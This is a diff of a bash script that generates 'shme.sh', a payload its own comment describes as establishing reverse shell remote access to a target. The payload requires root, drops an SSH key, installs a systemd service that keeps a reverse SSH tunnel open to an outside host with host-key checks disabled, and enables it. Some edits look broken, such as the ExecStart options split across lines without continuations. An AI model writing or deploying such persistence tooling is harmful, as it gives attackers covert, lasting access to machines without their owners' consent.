@@ -77,8 +77,8 @@ cat keys/$rmtUser.pub > /home/$rmtUser/.ssh/authorized_keys
 mkdir -p payloads
 rm payloads/*
 touch payloads/shme.sh
-printf "#!/bin/bash
-# single run installation script to establish reverse shell remote access to target
+payload="#!/bin/bash\
+# single run installation script to establish reverse shell remote access to target\
 
 # check run as 'root'
 if (((id -u) > 0)); then
@@ -89,11 +89,11 @@ fi
 # drop certificate file
 touch ~/.ssh/$rmtUser
 b64crt="$(base64 keys/$rmtUser)"
-base64 -d \$b64crt > ~/.ssh/$rmtUser
+base64 -d "\$b64crt" > ~/.ssh/$rmtUser
 
 # drop systemd file
 touch /etc/systemd/system/shme.service
-printf \"[Unit]
+sysd="[Unit]
         Description=Remote SSH tunnel to $SRVHOST as user $rmtUser
         Wants=network-online.target
         After=network-online.target
@@ -101,22 +101,25 @@ printf \"[Unit]
         
         [Service]
         Type=simple
-        ExecStart=/usr/bin/ssh -qNn \\
-        -o ServerAliveInterval=30 \\
-        -o ServerAliveCountMax=3 \\
-        -o ExitOnForwardFailure=yes \\
-        -o StrictHostKeyChecking=no \\
-        -o UserKnownHostsFile=/dev/null \\
-        -i /home/chlf/.ssh/$rmtUser \\
-        -R $RMTFWD:localhost:22 \\
+        ExecStart=/usr/bin/ssh -qNn
+        -o ServerAliveInterval=30
+        -o ServerAliveCountMax=3
+        -o ExitOnForwardFailure=yes
+        -o StrictHostKeyChecking=no
+        -o UserKnownHostsFile=/dev/null
+        -i /home/chlf/.ssh/$rmtUser
+        -R $RMTFWD:localhost:22
         $rmtUser@$SRVHOST -p $SRVSSH
         Restart=always
         RestartSec=60
         
         [Install]
-        WantedBy=multi-user.target\" > /etc/systemd/system/shme.service
-        
-sudo systemctl enable --now shme.service" > payloads/shme.sh
+        WantedBy=multi-user.target\""
+printf $sysd > /etc/systemd/system/shme.service
+sudo systemctl enable --now shme.service"
+
+printf $payload > payloads/shme.sh
+
 # err handling
 if (($? > 0)); then
     echo "[!] An error occurred generating payload file"
